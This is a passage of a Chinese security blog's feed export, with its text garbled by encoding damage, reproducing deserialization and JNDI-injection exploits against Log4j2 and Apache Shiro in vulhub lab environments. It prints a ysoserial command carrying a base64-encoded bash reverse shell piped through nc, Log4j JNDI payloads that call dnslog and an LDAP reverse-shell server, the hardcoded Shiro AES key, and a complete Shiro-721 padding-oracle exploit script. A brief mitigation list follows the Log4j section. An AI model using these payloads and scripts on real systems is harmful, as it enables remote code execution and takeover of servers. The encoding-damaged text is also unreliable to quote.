title="2ã€ç¯å¢ƒæ­å»º"></a>2ã€ç¯å¢ƒæ­å»º</h3><p>vulhub çš„CVE-2017-5645 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>ä½¿ç”¨ysoserialå·¥å…·ï¼šç½‘ç›˜å·²æä¾›</p><p>ysoserial æ˜¯ä¸€ä¸ªJavaååºåˆ—åŒ–çš„åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†å¤šç§åˆ©ç”¨é“¾ï¼Œå¯ä»¥ç”Ÿæˆåˆ©ç”¨ä¸å®‰å…¨çš„ Java å¯¹è±¡ååºåˆ—åŒ–çš„æ¶æ„è´Ÿè½½ï¼ˆpayloadï¼‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;éœ€è¦æ‰§è¡Œçš„è„šæœ¬base64ç¼–ç å’Œè§£ç å‘½ä»¤&quot; | nc é¶æœºIP é¶æœºç«¯å£</span><br><span class="line"></span><br><span class="line">å¦‚ï¼š</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjUwLzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | nc 192.168.31.52 4712</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Log4j/image-20240227162307265.png" alt="image-20240227162307265"></p><p>æˆåŠŸæ¥æ”¶åˆ°åå¼¹shellã€‚è¿™é‡Œç»è¿‡å°è¯•ï¼Œéœ€è¦åœ¨å…¬ç½‘ä¸Šæ‰§è¡Œè¿›è¡Œä¸­è½¬</p><h2 id="äºŒã€Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰"><a href="#äºŒã€Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰" class="headerlink" title="äºŒã€Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰"></a>äºŒã€Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -1"><a href="#1ã€æ¼æ´åŸå› -1" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p><strong>å½±å“ç‰ˆæœ¬ï¼š</strong>Apache Log4j 2 çš„ 2.0 åˆ° 2.14.1</p><p>log4j æ˜¯ Apache çš„ä¸€ä¸ªå¼€æºæ—¥å¿—åº“ï¼Œæ˜¯ä¸€ä¸ªåŸºäº Java çš„æ—¥å¿—è®°å½•æ¡†æ¶ï¼Œè€ŒLog4j2 æ˜¯ log4j çš„åç»§è€…ï¼Œå…¶ä¸­å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ï¼Œå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°ä¸ºæ§åˆ¶å°ã€æ–‡ä»¶ã€GUI ç»„å»ºç­‰ï¼Œè¢«åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨äºè®°å½•ç¨‹åºè¾“å…¥è¾“å‡ºæ—¥å¿—ä¿¡æ¯ã€‚log4j2 ä¸­å­˜åœ¨ JNDI æ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºè®°å½•ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ—¶ï¼Œå³å¯è§¦å‘è¯¥æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>æ¼æ´çš„åŸºæœ¬åŸç†æ˜¯Log4j2åœ¨å¤„ç†æ—¥å¿—æ¶ˆæ¯æ—¶ï¼Œä¼šè°ƒç”¨MessagePatternConverteræ¶ˆæ¯ç»„ä»¶ä¸­çš„format æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šæˆªå–æ¶ˆæ¯ä¸­çš„ç¾å…ƒç¬¦å·$è¿æ¥èŠ±æ‹¬å·{}ä¹‹é—´çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¿™äº›å­—ç¬¦ä¸²è¢«è®¾ç½®ä¸º <code>jndi:ldap</code> çš„åè®®æ ¼å¼ï¼ˆä¾‹å¦‚${jndi:ldap:&#x2F;&#x2F;x.x.x.x:8000&#x2F;xxx.class}ï¼‰ï¼ŒLog4j2è§£æåˆ° jndi åˆ™ä¼šå»æŒ‡å®šçš„ x.x.x.x:8000 çš„ ldap æœåŠ¡æ‰¾å¯¹åº”çš„xxx.classï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¼šå°è¯•ä»è¿œç¨‹æœºå™¨çš„ http æœåŠ¡ä¸Šæ‰¾ï¼Œå¦‚æœæ‰¾åˆ°äº†åˆ™è¿”å›åˆ° JNDI æ¥å£å’ŒLog4j2 ç»„ä»¶ï¼Œé‚£ä¹ˆLog4j2 ç»„ä»¶ä¼šå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æ˜¯class æ–‡ä»¶ï¼Œå°±ä¼šå»æ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œ</p><p><img src="/img/VulnRep-Log4j/image-20241012204429312.png" alt="image-20241012204429312"></p><h3 id="2ã€ç¯å¢ƒæ­å»º-1"><a href="#2ã€ç¯å¢ƒæ­å»º-1" class="headerlink" title="2ã€ç¯å¢ƒæ­å»º"></a>2ã€ç¯å¢ƒæ­å»º</h3><p>vulhub â€” CVE-2021-44228</p><h3 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>è®¿é—®é¶æœºIPï¼š8983</p><p><img src="/img/VulnRep-Log4j/image-20240227170038072.png" alt="image-20240227170038072"></p><p><strong>1ã€æ„é€ POC</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br><span class="line">è®¿é—®ï¼š</span><br><span class="line">http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p>åœ¨dnslogå¹³å°çœ‹åˆ°å›æ˜¾ï¼Œæˆ–è€…ç”¨BP çš„Collaborator ä¹Ÿå¯ä»¥</p><p><strong>2ã€åå¼¹shell</strong></p><p>æˆ‘ä»¬ç”¨åˆ°JNDIExploit.v1.2 å·¥å…·ï¼šç½‘ç›˜å·²æä¾›</p><p>å…ˆåœ¨vpsæ”»å‡»æœºä¸Šè¿›è¡Œç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨å·¥å…·æ‰§è¡Œï¼ˆéœ€è¦1389ã€8080ç«¯å£æœªå ç”¨ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps_ip</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒPOC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://10.211.55.3:1389/Basic/ReverseShell/10.211.55.23/6666&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸè·å–shell</p><p><img src="/img/VulnRep-Log4j/image-20240227175514673.png" alt="image-20240227175514673"></p><p>æœªå®Œå¾…ç»­ï¼š<a href="https://blog.csdn.net/Myon5/article/details/136548391">https://blog.csdn.net/Myon5/article/details/136548391</a></p><h2 id="ä¸‰ã€é˜²å¾¡æªæ–½"><a href="#ä¸‰ã€é˜²å¾¡æªæ–½" class="headerlink" title="ä¸‰ã€é˜²å¾¡æªæ–½"></a>ä¸‰ã€é˜²å¾¡æªæ–½</h2><ol><li>æ›´æ–°Log4jç‰ˆæœ¬ï¼šå‡çº§Log4j2åˆ°æœ€æ–°çš„å®‰å…¨ç‰ˆæœ¬ï¼ˆ2.16æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰ï¼Œè¿™äº›ç‰ˆæœ¬å·²ç»ä¿®å¤äº†è¿™ä¸ªæ¼æ´ã€‚<br>å¦‚æœæ— æ³•ç«‹å³å‡çº§ï¼Œå¯ä»¥æ·»åŠ ç³»ç»Ÿå±æ€§log4j2.formatMsgNoLookups&#x3D;trueæ¥ç¦ç”¨æ¶ˆæ¯æŸ¥æ‰¾åŠŸèƒ½ã€‚</li><li>é™åˆ¶å¤–éƒ¨æœåŠ¡å™¨è®¿é—®ï¼šé™åˆ¶æˆ–ç¦æ­¢å¯¹å¤–éƒ¨JNDIæœåŠ¡å™¨çš„è®¿é—®ï¼Œç‰¹åˆ«æ˜¯LDAPå’ŒRMIæœåŠ¡ã€‚</li><li>é™åˆ¶æ—¥å¿—è®¿é—®ï¼šé™åˆ¶å¯¹æ—¥å¿—æ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œä»¥é˜²æ­¢æœªç»æˆæƒçš„ç”¨æˆ·è®¿é—®å’Œæ“çºµæ—¥å¿—æ¶ˆæ¯ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Log4jç³»åˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Shiro ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
      <link href="/2024/02/27/VulnRep-Shiro/"/>
      <url>/2024/02/27/VulnRep-Shiro/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Shiro-æ¡†æ¶ä»‹ç»"><a href="#ä¸€ã€Shiro-æ¡†æ¶ä»‹ç»" class="headerlink" title="ä¸€ã€Shiro æ¡†æ¶ä»‹ç»"></a>ä¸€ã€Shiro æ¡†æ¶ä»‹ç»</h1><h2 id="1ã€Shiro-æ¡†æ¶ç®€ä»‹"><a href="#1ã€Shiro-æ¡†æ¶ç®€ä»‹" class="headerlink" title="1ã€Shiro æ¡†æ¶ç®€ä»‹"></a>1ã€Shiro æ¡†æ¶ç®€ä»‹</h2><p>Shiro æ¡†æ¶æ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œç”¨æ¥è¿›è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚</p><p>ä½†å¦‚æœrememberMe çš„AESåŠ å¯†ç§˜é’¥æ³„éœ²ï¼Œå°±ä¼šå¯¼è‡´shiroçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé€ æˆRCEã€‚</p><p>Shiro æ¡†æ¶çš„è®¤è¯æµç¨‹æ˜¯ï¼šæ‹¿åˆ° rememberMe çš„cookie å€¼â€“&gt;Base64 è§£å¯†â€“&gt;AESè§£å¯†â€“&gt;è¿›è¡Œååºåˆ—åŒ–ã€‚</p><h2 id="2ã€Shiro-æ¡†æ¶åˆ¤æ–­ï¼ˆæŒ‡çº¹è¯†åˆ«ï¼‰"><a href="#2ã€Shiro-æ¡†æ¶åˆ¤æ–­ï¼ˆæŒ‡çº¹è¯†åˆ«ï¼‰" class="headerlink" title="2ã€Shiro æ¡†æ¶åˆ¤æ–­ï¼ˆæŒ‡çº¹è¯†åˆ«ï¼‰"></a>2ã€Shiro æ¡†æ¶åˆ¤æ–­ï¼ˆæŒ‡çº¹è¯†åˆ«ï¼‰</h2><p>åœ¨åˆ©ç”¨ shiro æ¼æ´æ—¶éœ€è¦åˆ¤æ–­åº”ç”¨æ˜¯å¦ç”¨åˆ°äº† shiroã€‚åœ¨è¯·æ±‚åŒ…çš„ Cookie ä¸­ä¸º <code>rememberMe</code> å­—æ®µèµ‹ä»»æ„å€¼ï¼Œæ”¶åˆ°è¿”å›åŒ…çš„ Set-Cookie ä¸­å­˜åœ¨ <code>rememberMe=deleteMe</code> å­—æ®µï¼Œè¯´æ˜ç›®æ ‡æœ‰ä½¿ç”¨ Shiro æ¡†æ¶ï¼Œå¯ä»¥è¿›ä¸€æ­¥æµ‹è¯•ã€‚</p><h2 id="3ã€Shiro-åˆ©ç”¨éš¾ç‚¹æˆ–æ¡ä»¶"><a href="#3ã€Shiro-åˆ©ç”¨éš¾ç‚¹æˆ–æ¡ä»¶" class="headerlink" title="3ã€Shiro åˆ©ç”¨éš¾ç‚¹æˆ–æ¡ä»¶"></a>3ã€Shiro åˆ©ç”¨éš¾ç‚¹æˆ–æ¡ä»¶</h2><p>1ã€éœ€è¦çŸ¥é“AESåŠ å¯†çš„keyï¼ˆæ˜¯æ¼æ´å­˜åœ¨çš„å…³é”®ï¼‰</p><p>2ã€æ„é€ ä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡readObject æ¥æ‰§è¡Œå‘½ä»¤</p><h1 id="äºŒã€Shiro-550ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰"><a href="#äºŒã€Shiro-550ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰" class="headerlink" title="äºŒã€Shiro 550ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰"></a>äºŒã€Shiro 550ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰</h1><h2 id="1ã€æ¼æ´æˆå› "><a href="#1ã€æ¼æ´æˆå› " class="headerlink" title="1ã€æ¼æ´æˆå› "></a>1ã€æ¼æ´æˆå› </h2><p>å½±å“ç‰ˆæœ¬ï¼š<strong>Apache Shiro &lt;&#x3D;1.2.4</strong></p><p>åœ¨å—å½±å“çš„ Apache Shiro ç‰ˆæœ¬ä¸­ä½¿ç”¨äº†<strong>ç¡¬ç¼–ç </strong>åœ¨ä»£ç é‡Œçš„AESå¯†é’¥ <code>kPH+bIxk5D2deZiIxcaaaA==</code>ã€‚</p><h2 id="2ã€ç¯å¢ƒæ­å»º"><a href="#2ã€ç¯å¢ƒæ­å»º" class="headerlink" title="2ã€ç¯å¢ƒæ­å»º"></a>2ã€ç¯å¢ƒæ­å»º</h2><p>ä½¿ç”¨vulhub æ­å»ºé¶åœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Shiro/image-20240227134907495.png" alt="image-20240227134907495"></p><h2 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h2><p>ç”¨BPæŠ“åŒ…ï¼Œç¡®è®¤æ˜¯Shiro æ¡†æ¶</p><p><img src="/img/VulnRep-Shiro/image-20240227135459292.png" alt="image-20240227135459292"></p><p>æˆ‘ä»¬ä½¿ç”¨ç°æˆçš„å·¥å…·è¿›è¡Œæ£€æµ‹ï¼ŒæŒ‡å®šå›ºå®šçš„å¯†é’¥</p><p><img src="/img/VulnRep-Shiro/image-20240227140040809.png" alt="image-20240227140040809"></p><p><img src="/img/VulnRep-Shiro/image-20240227140136993.png" alt="image-20240227140136993"></p><h2 id="4ã€å†…å­˜é©¬æ³¨å…¥"><a href="#4ã€å†…å­˜é©¬æ³¨å…¥" class="headerlink" title="4ã€å†…å­˜é©¬æ³¨å…¥"></a>4ã€å†…å­˜é©¬æ³¨å…¥</h2><p>å…ˆå‡†å¤‡å¥½Shiro ç±»å‹çš„å†…å­˜é©¬ï¼šæ˜¯ç»è¿‡äº†åºåˆ—åŒ–å’ŒAESåŠ å¯†ä»¥åŠBase64åŠ å¯†</p><p><img src="/img/VulnRep-Shiro/image-20240423171813971.png" alt="image-20240423171813971"></p><p>æŠ“åŒ…æ³¨å…¥</p><p><img src="/img/VulnRep-Shiro/image-20240423172324721.png" alt="image-20240423172324721"></p><p>èšå‰‘è¿æ¥</p><p><img src="/img/VulnRep-Shiro/image-20240423174226067.png" alt="image-20240423174226067"></p><h1 id="ä¸‰ã€Shiro-721ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2019-12422ï¼‰"><a href="#ä¸‰ã€Shiro-721ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2019-12422ï¼‰" class="headerlink" title="ä¸‰ã€Shiro 721ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2019-12422ï¼‰"></a>ä¸‰ã€Shiro 721ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2019-12422ï¼‰</h1><h2 id="1ã€æ¼æ´æˆå› -1"><a href="#1ã€æ¼æ´æˆå› -1" class="headerlink" title="1ã€æ¼æ´æˆå› "></a>1ã€æ¼æ´æˆå› </h2><p>å½±å“ç‰ˆæœ¬ï¼š<strong>1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D;1.4.1</strong></p><p>Shiro 1.2.4 ä»¥ä¸Šç‰ˆæœ¬å®˜æ–¹ç§»é™¤äº†ä»£ç ä¸­çš„é»˜è®¤å¯†é’¥ï¼Œè¦æ±‚å¼€å‘è€…è‡ªå·±è®¾ç½®ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰è®¾ç½®ï¼Œåˆ™é»˜è®¤åŠ¨æ€ç”Ÿæˆï¼Œé™ä½äº†å›ºå®šå¯†é’¥æ³„æ¼çš„é£é™©ã€‚ä½†æ˜¯å…¶ä»–è§£æè¿‡ç¨‹ä¾ç„¶ä¸€æ ·ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°aes è§£å¯†ä½¿ç”¨çš„key çš„è¯ï¼Œä¾ç„¶èƒ½å¤Ÿè¿›è¡Œååºåˆ—åŒ–RCEã€‚</p><p>åœ¨æ¼æ´åˆ©ç”¨æœ‰å‡ æ¡å‰æï¼š</p><ol><li>æœ‰rememberMe åŠŸèƒ½ï¼›</li><li>å…¶ä¸­AES ä½¿ç”¨ AES-CBC æ¨¡å¼ï¼›</li><li>èƒ½è·å–åˆ°æ­£å¸¸ Cookieï¼Œå³ç”¨æˆ·æ­£å¸¸ç™»å½•çš„ Cookie å€¼ï¼›</li><li>å¯†æ–‡å¯æ§ï¼›</li></ol><h2 id="2ã€ç¯å¢ƒæ­å»º-1"><a href="#2ã€ç¯å¢ƒæ­å»º-1" class="headerlink" title="2ã€ç¯å¢ƒæ­å»º"></a>2ã€ç¯å¢ƒæ­å»º</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inspiringz/Shiro-721.git</span><br><span class="line">cd Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .</span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure><p>å¦‚æœæœªèƒ½å¯åŠ¨æˆåŠŸï¼Œå¯ä»¥å†æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -p 8080:8080 -it shiro-721</span><br></pre></td></tr></table></figure><p>å°†ä¼šæŠŠå®¹å™¨çš„æ‰§è¡Œæƒ…å†µè¾“å‡ºåˆ°å‰å°ï¼Œä¹‹åè®¿é—®å³å¯</p><p><img src="/img/VulnRep-Shiro/image-20240314141349035.png" alt="image-20240314141349035"></p><h2 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h2><p>è®¿é—®é¶æœºçš„8080ç«¯å£ï¼Œè¿›å…¥ç™»å½•é¡µé¢</p><p><img src="/img/VulnRep-Shiro/image-20240314160244583.png" alt="image-20240314160244583"></p><p>ä¸Šæ–¹æç¤ºäº†ç”¨æˆ·åå’Œå¯†ç ï¼Œæˆ‘ä»¬ç”¨å…¶ä¸­ä¸€ä¸ªè¿›è¡Œç™»å½•ï¼Œå¹¶å‹¾é€‰<code>Remember Me</code>ï¼ŒæŠ“åŒ…</p><p><img src="/img/VulnRep-Shiro/image-20240314161130004.png" alt="image-20240314161130004"></p><p>ç¡®è®¤æ˜¯Shiro æ¡†æ¶ï¼Œæˆ‘ä»¬ä¾ç„¶ä½¿ç”¨å·¥å…·ï¼Œæˆ‘ä»¬ä¸çŸ¥é“aesåŠ å¯†çš„å¯†é’¥kayï¼Œéœ€è¦åœ¨ç™»å½•æˆåŠŸä¹‹åå°è¯•çˆ†ç ´</p><p><img src="/img/VulnRep-Shiro/image-20240314161503333.png" alt="image-20240314161503333"></p><p>ä¹‹åå¡«å…¥å¯†é’¥ï¼Œæ£€æµ‹åˆ©ç”¨é“¾ï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œï¼ŒæˆåŠŸè·å–shell</p><p><img src="/img/VulnRep-Shiro/image-20240314161603880.png" alt="image-20240314161603880"></p><h2 id="4ã€ä½¿ç”¨ysoserial-å·¥å…·ç”Ÿæˆ-URLDNS-åˆ©ç”¨é“¾æ‰‹å·¥éªŒè¯"><a href="#4ã€ä½¿ç”¨ysoserial-å·¥å…·ç”Ÿæˆ-URLDNS-åˆ©ç”¨é“¾æ‰‹å·¥éªŒè¯" class="headerlink" title="4ã€ä½¿ç”¨ysoserial å·¥å…·ç”Ÿæˆ URLDNS åˆ©ç”¨é“¾æ‰‹å·¥éªŒè¯"></a>4ã€ä½¿ç”¨ysoserial å·¥å…·ç”Ÿæˆ URLDNS åˆ©ç”¨é“¾æ‰‹å·¥éªŒè¯</h2><p>1ã€ç”Ÿæˆclass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS &quot;http://xxx.dnslog.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure><p>2ã€åˆ©ç”¨é¡¹ç›®è‡ªå¸¦çš„exp è„šæœ¬è¿›è¡Œæ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/3ndz/Shiro-721  </span><br><span class="line"># -*- coding: utf-8 -*-  </span><br><span class="line">from paddingoracle import BadPaddingException, PaddingOracle  </span><br><span class="line">from base64 import b64encode, b64decode  </span><br><span class="line">from urllib import quote, unquote  </span><br><span class="line">import requests  </span><br><span class="line">import socket  </span><br><span class="line">import time  </span><br><span class="line">  </span><br><span class="line">class PadBuster(PaddingOracle):  </span><br><span class="line">    def __init__(self, **kwargs):  </span><br><span class="line">        super(PadBuster, self).__init__(**kwargs)  </span><br><span class="line">        self.session = requests.Session()  </span><br><span class="line">        self.wait = kwargs.get(&#x27;wait&#x27;, 2.0)  </span><br><span class="line">  </span><br><span class="line">    def oracle(self, data, **kwargs):  </span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)  </span><br><span class="line">        self.session.cookies[&#x27;rememberMe&#x27;] = somecookie  </span><br><span class="line">        if self.session.cookies.get(&#x27;JSESSIONID&#x27;):  </span><br><span class="line">            del self.session.cookies[&#x27;JSESSIONID&#x27;]  </span><br><span class="line">        while 1:  </span><br><span class="line">            try:  </span><br><span class="line">                response = self.session.get(sys.argv[1],  </span><br><span class="line">                        stream=False, timeout=5, verify=False)  </span><br><span class="line">                break  </span><br><span class="line">            except (socket.error, requests.exceptions.RequestException):  </span><br><span class="line">                logging.exception(&#x27;Retrying request in %.2f seconds...&#x27;,  </span><br><span class="line">                                  self.wait)  </span><br><span class="line">                time.sleep(self.wait)  </span><br><span class="line">                continue  </span><br><span class="line">  </span><br><span class="line">        self.history.append(response)  </span><br><span class="line">        if response.headers.get(&#x27;Set-Cookie&#x27;) is None or &#x27;deleteMe&#x27; not in response.headers.get(&#x27;Set-Cookie&#x27;):  </span><br><span class="line">            logging.debug(&#x27;No padding exception raised on %r&#x27;, somecookie)  </span><br><span class="line">            return  </span><br><span class="line">        raise BadPaddingException  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:  </span><br><span class="line">    import logging  </span><br><span class="line">    import sys  </span><br><span class="line">  </span><br><span class="line">    if not sys.argv[3:]:  </span><br><span class="line">        print &#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27; % (sys.argv[0], )  </span><br><span class="line">        sys.exit(1)  </span><br><span class="line">  </span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[2]))  </span><br><span class="line">    padbuster = PadBuster()  </span><br><span class="line">    payload = open(sys.argv[3], &#x27;rb&#x27;).read()  </span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=16)  </span><br><span class="line">    print(&#x27;rememberMe cookies:&#x27;)  </span><br><span class="line">    print(b64encode(enc))</span><br></pre></td></tr></table></figure><p>3ã€æ‰§è¡Œè„šæœ¬ï¼Œå°†class æ”¾ç½®åŒçº§ç›®å½•å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://192.168.5.3:8081/shiro721_war/account &lt;/COGnLcSO/3cUooGdYVDkQQNHrfZTNY+k0BCXPOmA9L+l7MRr3ZRYyuzDWZPNTSUFmFlkZWG+HJcecRLkdAMuxa43+i/hynQP7cYrDiulXmfTbuKmL8oz9DO9pmpUaumyCU0V3xfyLsv0+o3uYK/8Tlh9Ns+TMng3lMenVclDk3pjL/tPL/gfVFz50SMZw67WgdbG4mBzq0URLXG6d9yqB469ruPeKty5q3yjSfWDvOxJcR2OpUJg6dauiJNqwQwsu3FrkPmUlEAwZtQ/EpS9+74Ey5YVNuq350U00Df4ckmmHURCdRi/847d2dSHNQ80Wsoe4IseBOXabm6CBs+mcb4PWptM//E7CDaY6/UwTOm5yzK8/KSa+RNSXhHkOx4CH9wOyh8peq8bexGtoI1CzkqK54QwFkOzCu/bE9VPDU7ylZil3Xlc5oTDy79BHAZXfOgbUcgSSoV6OoOVG1DC6o6ptRYlFT0KBNjwS+ivFtbbA7kxf2Fq9K4tqxC2QI3&gt; payload.class</span><br></pre></td></tr></table></figure><p>4ã€æœ€ç»ˆè¿è¡ŒæˆåŠŸä¼šç»™æˆ‘ä»¬ä¸€ä¸ª rememberMe cookie å»æ‰“</p><p><img src="/img/VulnRep-Shiro/image-20241005172621819.png" alt="image-20241005172621819"></p><p>5ã€æˆåŠŸæ‹¿åˆ°å›æ˜¾</p><p><img src="/img/VulnRep-Shiro/image-20241005172738278.png" alt="image-20241005172738278"></p><p>6ã€æ³¨æ„ç‚¹</p><p>æœ‰ä¸€ä¸ªæ³¨æ„çš„å°ç‚¹å°±æ˜¯æˆ‘ä»¬è¦æŠŠCookie ä¸­çš„JSESSIONID å­—æ®µå»æ‰ï¼Œä¸ç„¶ä¸ä¼šèµ°rememberMe 